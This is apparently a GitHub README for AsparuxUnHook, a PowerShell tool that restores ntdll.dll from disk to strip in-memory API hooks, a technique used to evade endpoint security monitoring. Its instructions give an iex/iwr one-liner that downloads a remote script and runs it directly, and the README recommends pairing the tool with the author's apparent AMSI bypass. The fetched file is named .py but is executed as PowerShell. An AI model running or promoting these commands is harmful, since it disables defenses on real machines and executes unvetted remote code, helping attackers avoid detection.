# AsparuxUnHook

AsparuxUnHook is an advanced tool written in PowerShell that uses Reflection to access the Windows API and low-level functions. This tool focuses on cleaning the hooks present in the ntdll.dll module from memory, restoring its original state by reading ntdll.dll directly from disk.

FUNCTION HOOKED -->

![imatge](https://github.com/user-attachments/assets/bf8551e6-c9ae-479f-89fd-51a59a447175)


FUNCTION UNHOOKED (Clear function after running AsparuxUnHook) --> 

![imatge](https://github.com/user-attachments/assets/77e4e26b-fd9d-4fed-8380-9934aed1a719)


# Instruction 

```
iex (iwr -UseBasicParsing https://raw.githubusercontent.com/ASP4RUX/ReflectionUnHook/refs/heads/main/asamsiobfuscate.py)
```

```
Invoke-AsparuxUnHook
```

```
Invoke-AsparuxUnHook -v
```

#Recomendation

I recommend using the Invoke-ASAMSI that I have in my github followed by running AsparuxUnHook
